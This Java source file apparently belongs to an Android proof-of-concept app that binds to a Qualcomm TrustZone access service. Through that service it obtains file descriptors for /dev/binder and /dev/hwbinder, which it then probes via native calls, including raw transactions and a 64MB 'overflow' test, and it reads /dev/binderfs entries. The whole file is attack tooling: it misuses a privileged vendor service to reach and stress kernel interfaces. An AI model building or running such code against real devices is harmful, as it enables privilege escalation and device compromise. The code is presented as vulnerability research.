package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native String nativeBinderVersion(int fd);
    public static native String nativeBinderSetMaxThreads(int fd, int max);
    public static native String nativeBinderGetNodeInfo(int fd, int handle);
    public static native String nativeBinderTransaction(int fd, int targetHandle, int flags);
    public static native String nativeBinderOverflow(int fd, long size);
    public static native String nativeBinderIoctlTest(int fd, int cmd, long arg);
    public static native String nativeBinderfsRead(String path);
    public static native String[] nativeBinderfsList(String path);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting tests");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeTests());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("Binder POC started. Press Start.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e);
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private ParcelFileDescriptor openTzDevice(String path) {
        if (tzService == null) return null;
        try {
            int[] handle = new int[1];
            ParcelFileDescriptor pfd = tzService.a(path, handle);
            if (pfd != null && handle[0] >= 0) {
                appendLog("[TZ] Opened " + path + " handle=" + handle[0]);
                return pfd;
            } else {
                appendLog("[TZ] Failed to open " + path + " handle=" + (handle != null ? handle[0] : "null"));
                return null;
            }
        } catch (RemoteException e) {
            appendLog("[TZ] RemoteException: " + e);
            return null;
        }
    }

    private void executeTests() {
        appendLog("========================================");
        appendLog("========== BINDER POC ==========");

        // 1. /dev/binder
        testBinderDevice("/dev/binder");

        // 2. /dev/hwbinder
        testBinderDevice("/dev/hwbinder");

        // 3. /dev/binderfs (if present)
        testBinderfs();

        appendLog("========== BINDER POC COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testBinderDevice(String devicePath) {
        appendLog("[*] Testing " + devicePath);
        ParcelFileDescriptor pfd = openTzDevice(devicePath);
        if (pfd == null) {
            appendLog("[!] Could not open " + devicePath);
            return;
        }
        FileDescriptor fdObj = pfd.getFileDescriptor();
        if (fdObj == null || !fdObj.valid()) {
            appendLog("[!] Invalid FD for " + devicePath);
            try { pfd.close(); } catch (Exception ignored) {}
            return;
        }
        int fd = pfd.getFd();
        appendLog("[+] Opened " + devicePath + " fd=" + fd);

        // 1. Get version
        String version = nativeBinderVersion(fd);
        appendLog("[VERSION] " + version);

        // 2. Set max threads
        String setMax = nativeBinderSetMaxThreads(fd, 15);
        appendLog("[SET_MAX_THREADS] " + setMax);

        // 3. Get node info for handle 0 (context manager)
        String nodeInfo = nativeBinderGetNodeInfo(fd, 0);
        appendLog("[NODE_INFO] " + nodeInfo);

        // 4. Send transaction (handle 0, flags 0)
        String txn = nativeBinderTransaction(fd, 0, 0);
        appendLog("[TRANSACTION] " + txn);

        // 5. Send one-way transaction
        String txnOneway = nativeBinderTransaction(fd, 0, 1); // TF_ONE_WAY = 1
        appendLog("[TRANSACTION_ONEWAY] " + txnOneway);

        // 6. Overflow test (64MB buffer)
        String overflow = nativeBinderOverflow(fd, 64 * 1024 * 1024);
        appendLog("[OVERFLOW] " + overflow);

        // 7. Additional ioctl tests (BINDER_WRITE_READ with empty read/write)
        String ioctlTest = nativeBinderIoctlTest(fd, 0x40046201, 0); // BINDER_VERSION
        appendLog("[IOCTL_TEST] " + ioctlTest);

        try { pfd.close(); } catch (Exception ignored) {}
    }

    private void testBinderfs() {
        String binderfsPath = "/dev/binderfs";
        File f = new File(binderfsPath);
        if (!f.exists()) {
            appendLog("[BINDERFS] " + binderfsPath + " does not exist");
            return;
        }
        if (!f.isDirectory()) {
            appendLog("[BINDERFS] " + binderfsPath + " is not a directory");
            return;
        }
        appendLog("[BINDERFS] Listing " + binderfsPath);
        String[] entries = nativeBinderfsList(binderfsPath);
        if (entries == null) {
            appendLog("[BINDERFS] Failed to list directory");
            return;
        }
        for (String entry : entries) {
            appendLog("[BINDERFS] " + entry);
            String fullPath = binderfsPath + "/" + entry;
            String content = nativeBinderfsRead(fullPath);
            if (content != null) {
                appendLog("[BINDERFS] " + fullPath + " = " + content.trim());
            } else {
                appendLog("[BINDERFS] " + fullPath + " (unreadable)");
            }
        }
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getExternalFilesDir(null);
            if (dir == null) dir = getFilesDir();
            File file = new File(dir, "binder_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), java.nio.charset.StandardCharsets.UTF_8))) {
                pw.println("=== Binder POC Log ===");
                pw.println("Timestamp: " + new Date());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e);
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Binder tests completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
